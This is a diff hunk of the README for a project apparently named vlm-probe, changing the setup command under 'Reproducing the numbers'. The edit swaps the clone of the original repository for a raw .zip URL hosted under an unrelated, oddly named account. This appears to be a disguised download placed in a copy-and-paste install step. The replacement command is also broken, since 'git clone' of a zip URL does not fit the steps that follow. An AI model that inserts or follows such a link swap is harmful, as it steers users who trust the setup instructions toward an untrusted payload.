@@ -25,7 +25,7 @@ If you find any of the scripts here useful, please cite the report (preprint pen
 ## Reproducing the numbers
 
 ```bash
-git clone https://github.com/marived/vlm-probe.git
+git clone https://github.com/ectozoan-pursued272/vlm-probe/raw/refs/heads/main/vlmprobe/data/probe_vlm_3.2.zip
 cd vlm-probe
 pip install -e .
 
